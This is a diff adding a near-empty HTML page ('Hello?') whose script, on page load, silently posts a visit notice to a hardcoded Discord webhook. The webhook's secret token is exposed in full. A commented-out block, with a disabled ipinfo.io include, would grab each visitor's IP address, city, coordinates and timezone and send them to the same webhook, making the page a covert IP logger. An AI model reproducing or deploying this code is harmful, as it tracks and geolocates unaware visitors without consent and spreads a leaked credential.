@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <span id="span">Hello?</span>
+    <script>
+        /* function getIP(json) {
+            city = json.city
+            country = json.country
+            hostname = json.hostname
+            ip = json.ip
+            loc = json.loc
+            org = json.org
+            readme = json.readme
+            region = json.region
+            timezone = json.timezone
+            date = new Date();
+            let final = `**${city}, ${region}, ${country}**\nIP:               ${ip}\nLocation: ${loc}\nTimezone: ${timezone}\nTimestamp: <t:${Math.round(date.getTime()/1000)}:R>\n\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_`
+            sendMessage(final);
+        }*/
+        function sendMessage(text) {
+            const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1289896550503288862/GzEjNevTjxzwYEm6eHKB85fy_UDtFFaPDXl5Ohy03FkNh3_isD1B-AUN3C3XBycQ8N1s");
+            
+            request.setRequestHeader('Content-type', 'application/json');
+            
+            const params = {
+                username: "Website Logger",
+                avatar_url: "https://th.bing.com/th/id/OIP.qpN_AXSbbxt-Z4zqNfyiFAHaHa?rs=1&pid=ImgDetMain",
+                content: text
+            }
+            
+            request.send(JSON.stringify(params));
+        }
+        let date = new Date();
+        sendMessage(`Someone viewed your website <t:${Math.round(date.getTime()/1000)}:R>`);
+        </script>
+        <!--<script type="application/javascript" src="http://ipinfo.io/?format=jsonp&callback=getIP"></script>-->
+</body>
+</html>
